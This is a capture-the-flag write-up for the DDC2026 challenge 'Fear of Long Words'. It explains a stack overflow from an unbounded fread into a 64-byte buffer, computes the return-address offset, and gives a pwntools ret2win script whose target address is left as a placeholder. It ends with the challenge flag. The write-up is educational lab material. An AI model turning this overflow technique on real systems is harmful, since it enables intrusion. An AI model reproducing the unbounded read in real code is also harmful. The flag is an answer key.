---
layout: layouts/post.njk
date: 2026-02-21
title: "Fear of Long Words"
category: Reverse Engineering
difficulty: Easy
tags: [DDC2026]
description: "ret2win via unchecked word length."
---

## Challenge overview
`ordbog` is a 32-bit ELF with a menu:

- `add <length>`
- `show`
- `exit`

This is a ret2win challenge.

## Source
Source was available (`ordbog.c`), and the bug is directly visible in `make_word`:

```c
char *make_word(int length) {
    char buffer[64];
  
    fread(buffer, 1, length, stdin);
    char *word = malloc(length + 1);
    memcpy(word, buffer, length);
    word[length] = '\0';
    return word;
}
```

`buffer` is 64 bytes, but `fread` uses user-controlled `length` with no upper bound. That is a stack overflow.

The win function entry is:

```asm
08049256 <win>:
```

and it clearly reads `flag.txt` and prints it:

```asm
call   8049110 <fopen@plt>
call   80490a0 <fgets@plt>
call   8049060 <printf@plt>
```

## Offset
Static layout from `make_word` shows the saved return address is `0x50` bytes past the start of the local buffer, so the total length is `0x54` (84):

```text
saved_ret - buffer_start
= (ebp + 0x4) - (ebp - 0x4c)
= 0x50
```

## Exploit

```python
from pwn import *

context.log_level = "error"

#io = process("./ordbog", stdin=PIPE, stdout=PIPE)
r = remote('challenge.url', 1337, ssl=True)

r.sendline(b"add 84")
r.send(b"A" * 0x50 + p32(0x????????))
print(r.recvall().decode(errors="replace"))
```

## Result

```bash
Congratulations! Here is your flag: DDC{D3m0n1c_d1ct1on4ry_d3str0y3r}
```
